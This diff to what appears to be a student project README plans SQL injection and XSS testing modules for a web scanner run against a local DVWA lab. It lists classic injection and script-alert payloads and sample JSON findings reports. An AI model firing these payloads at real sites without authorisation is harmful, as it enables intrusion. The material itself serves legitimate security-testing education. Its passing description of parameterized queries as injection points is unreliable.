@@ -298,3 +298,146 @@
 
 ###### \-   Structured mapping of application attack surfaces
 
+
+
+
+###### \-   MileStone 2
+
+ Week 3: SQL Injection Testing Module
+ Objective : Detect and document SQL injection vulnerabilities
+
+- Inject SQL payloads from `sql.txt` into detected input fields and URL parameters
+- Analyze server responses for anomalies and error patterns
+- Identify successful injection points (e.g., parameterized queries, error-based SQLi)
+- Generate `sqli_result.json` with detailed findings
+- Integrate SQL testing into `scanner.py` module
+
+ Key Files : `scanner.py`, `sql.txt`, `reports/sqli_result.json`
+
+ Deliverables : JSON report documenting all SQL injection vulnerabilities
+
+---
+
+   Week 4: Cross-Site Scripting (XSS) Testing Module
+ Objective : Detect and document XSS vulnerabilities
+
+- Inject XSS payloads from `xss.txt` into form fields and URLs
+- Detect reflected or stored scripts via response analysis and DOM inspection
+- Record vulnerable endpoints with XSS prevention recommendations
+- Generate `xss_result.json` with comprehensive findings
+- Integrate XSS testing into `scanner.py` module
+
+ Key Files : `scanner.py`, `xss.txt`, `reports/xss_result.json`
+
+ Deliverables : JSON report documenting all XSS vulnerabilities
+
+---
+
+  Input Files: Payload Structure
+
+   SQL Injection Payloads (`sql.txt`)
+
+Each line contains one SQL injection payload. Example:
+
+```
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1'  
+admin' --
+1' UNION SELECT NULL--
+' AND 1=1--
+```
+
+   XSS Payloads (`xss.txt`)
+
+Each line contains one XSS payload.Example:
+
+```
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+```
+Output:
+
+ 1. SQL Injection Report (`sqli_result.json`)
+
+Structured JSON report with detailed SQLi findings:
+
+json
+{
+  "scan_date": "2024-03-02T14:30:00",
+  "target_url": "http://localhost/dvwa/vulnerabilities/sqli/",
+  "vulnerabilities_found": 3,
+  "results": [
+    {
+      "payload": "' OR '1'='1",
+      "parameter": "id",
+      "method": "GET",
+      "status": "vulnerable",
+      "response_code": 200,
+      "evidence": "Database error detected",
+      "injection_point": "URL parameter"
+    },
+    {
+      "payload": "1' UNION SELECT NULL--",
+      "parameter": "id",
+      "method": "GET",
+      "status": "vulnerable",
+      "response_code": 200,
+      "evidence": "UNION query executed successfully",
+      "injection_point": "Parameterized query"
+    }
+  ]
+}
+```
+
+   3. XSS Report (`xss_result.json`)
+
+Structured JSON report with detailed XSS findings:
+
+json
+{
+  "scan_date": "2024-03-02T14:35:00",
+  "target_url": "http://localhost/dvwa/vulnerabilities/xss_r/",
+  "vulnerabilities_found": 2,
+  "results": [
+    {
+      "payload": "<script>alert('XSS')</script>",
+      "parameter": "name",
+      "method": "GET",
+      "status": "vulnerable",
+      "response_code": 200,
+      "evidence": "Payload reflected in response",
+      "xss_type": "reflected"
+    },
+    {
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "parameter": "message",
+      "method": "POST",
+      "status": "vulnerable",
+      "response_code": 200,
+      "evidence": "Script detected via DOM inspection",
+      "xss_type": "stored"
+    }
+  ]
+}
+
+
+###### **Milestone 2 Outcome**
+
+SQL and XSS payloads are injected into identified input fields and URL parameters discovered during crawling.
+
+Server responses are analyzed to detect abnormal behavior such as database errors (SQLi) or script reflection/execution (XSS).
+
+Vulnerable parameters and endpoints are identified along with request method (GET/POST) and injection type.
+
+Successful SQL Injection attacks (e.g., error-based, UNION-based) and XSS attacks (reflected or stored) are confirmed using response and DOM analysis.
+
+Detailed structured reports are generated in JSON format:
+
+sqli_result.json for SQL Injection findings
+
+xss_result.json for XSS findings
+
+The reports include payload used, injection point, response code, evidence of vulnerability, and total vulnerabilities found for documentation and analysis.
